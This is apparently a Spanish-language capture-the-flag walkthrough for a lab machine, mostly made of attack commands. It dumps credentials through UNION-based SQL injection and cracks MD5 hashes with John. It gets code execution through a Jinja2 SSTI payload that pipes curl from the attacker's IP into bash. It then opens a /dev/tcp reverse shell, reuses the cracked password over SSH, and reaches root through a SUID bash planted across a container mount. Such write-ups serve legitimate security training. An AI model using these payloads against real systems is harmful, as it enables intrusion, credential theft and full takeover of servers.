## Summary

Tags: #SQLI #Linux #Hash-Identifier #JohnTheRipper #Flask #SSTI #Contenedor #Montura #Base64 #FileTransfer #Extend-Path #BurpSuite #RCE #ReverShell 

- IP -> 10.10.11.130
- Ports -> TCP (80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 80 -> Apache httpd 2.4.51

## Launchpad

-   [Launchpad](https://launchpad.net/ubuntu)
* [SSTI-Flask](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
## Recon

```bash 
❯ whatweb ❮http://❮IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

❯ nmap --script http-enum -p80 ❮Target IP❯ -oN WebScan #  http-enum = Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen
```

```bash 
# Encontramos un panel de login en el cual usaremos Burpsuite para ver si existen inyecciones SQL

❯ ' or 1=1-- -              # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion, pero devuelve todo en la bvase de datos cuando no se utiliza en el panel de login'

# Una vez verificada la inyeccion, procedemos a dumpear la DB ademas de los usuarios  y passwd. 
❯ ' order by 100-- -                            # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error

❯ ' union select 1,2,3,4 -- -                   # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo y es en la '4'

❯ ' union select 1,2,3, -- -                    # Miramos la DB actual de trabajo 

❯ ' union select schema_name from information_schema.schemata-- -                    # Nos muestra todas las bases de datos existentes, pero miramos que en el 'Burpsuite' nos las muestra juntas

❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -  # Nos muestra las tablas existentes

❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las columnas existentes

❯ ' union select group_concat(username,0x3a,password) from ❮Table_Name❯-- -      # Para que nos muestre los datos de los usuarios y su passwd separados por :

	 # Debemos de colocar los caracteres en Hexadecimal para evitar fallos
	 # : = 0x3a (Hex) 
```

```bash 
# Hacerlo desde la bash de forma automatizada

❯ for i in $(seq 0 10); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.10.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=aa" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done 

	# s/^ *// = Todo lo que comience con espacio seguido de nada lo quite 
	# awk '{print $1}' FS="<" = Queremos el primer argumento tomando '<' como delimitador
```

```bash 
# Encontramos el user y su password, pero esta esta hasheada en MD5, po rlo que usamos John
❯ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt <Hashfile>    # Crackear un hash con un formato especifico
```

```bash 
# Dentro del panel 'goodgames' al ingresar por medio de la inyeccion, miramos que hay un icono de 'configuracion' el cual nos lleva a otro dominio que debemos de agregar en el '/etc/hosts'. Es un nuevo panel en donde usaremos el usuario y la passwd que encontramos en la inyeccion SQL para poder ingresar. 
```

## User

```bash 
# En la pagina corre 'Flask', ademas encontramos un panel de 'settings' y en al momento que colocamos el nombre, podemos observar que se refleja en la web, procedemos a colocar un '{{7*7}}' y como nos lo interpreta ya que nos muestra un '49', esto quiere decir que tendriamos un 'SSTI'. 

# Buscamos en Google 'SSTI Flask' y encontramos lo siguiente en la parte de 'Jinja2 - Remote Code Execution': 
❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}         # Nos muestra el id en la web

❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.26').read() }}   # Ver si alcanzamos nuestra maquina de atacante y asi poder hacer un archivo 'index.html' con una revershell

❯ {{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl http://10.10.14.26 | bash').read() }}  # Interpretamos el contenido del 'index.html' con bash y asi obtendremos la revershell
```

```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

```bash 
❯ nc -nlvp 443      # Nos ponemos en escucha para recibir la revershell 

# Ahora estamos en el contenedor como el usuario 'root; y con la IP '172.19.0.2'
```

```bash 
❯ route            # Nos muestra la tabla de ruteo y ahi podemos observar que existe la IP '172.19.0.1' que es la maquina real
```

```bash 
❯ script /dev/null -c bash                               # Inicio del tratamiento de la consola 
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

❯ export TERM=xterm-256color                             # Para que la shell tenga colores 
	❯ source /etc/skel/.bashrc

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189  
```

```bash 
# Si encontramos en el contenedor un directorio de un 'usuario' pero este usuario no se encuentra en el '/etc/passwd' quiere decir que existe una montura, ademas de tener un 'id=1000'.
```

```bash 
# Creamos un script para saber si hay puertos abiertos 

#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
}

# Ctrl_c
trap ctrl_c INT

tput civis

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Puerto $port abierto" & 
done; wait

tput cnorm
```

```bash 
# Transferir el script a la maquina victima con 'base64'

❯ base64 -w 0 script.sh | xclip -sel clip      # Transferir un script cuando no existe nano, nvim, trasformamos a base64 y lo copiamos a la clipboard, esto en la maquina de atacante 

❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos, guardamos y le damos permisos de ejecucion... todo esto en la maquina victima Linux
```

```bash 
# Encontramos el puerto 22 abierto, por lo que utilizaremos el usuario y reciclaremos la passwd des-hasheada con John

❯ ssh augustus@172.19.0.1                # Nos conectamos por ssh a la maquina 'real' 
```

## Root

```bash 
# Buscamos todos las posibles escaladas de privilegios, si no hay algun comando es porque el 'path' es muy corto y debemos de psarle uno mas largo 

# Buscar permisos SUID
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 

# Buscar grupos especiales
❯ id 

# Buscar binarios con privilegios 
❯ sudo -l 

# Buscar capabilities en el sistema 
❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva

# Buscaremos tareas CRON
❯ cat /etc/crontab 
```

```bash 
# Como al usuario se le copio su directorio al contenedor. 
1. Copiamos la bash del 'usuario' al directorio '/home'
	❯ cp /usr/bin/bash .
2. Nos salimos de la maquina 'real' para regresar al contenedor
3. En el contenedor retocamos la 'bash' y le agregamos el propietario y grupo 'root:root'
	❯ chown root:root bash
4. Le agregamos el permisos 'SUID' a la 'bash' con 4755
	❯ chmod 4755 bash 
5. Regresamos a la maquina 'real' con ssh
6. Ejecutas la 'bash' como privilegiado
❯ ./bash -p           # Ahora somos root 
```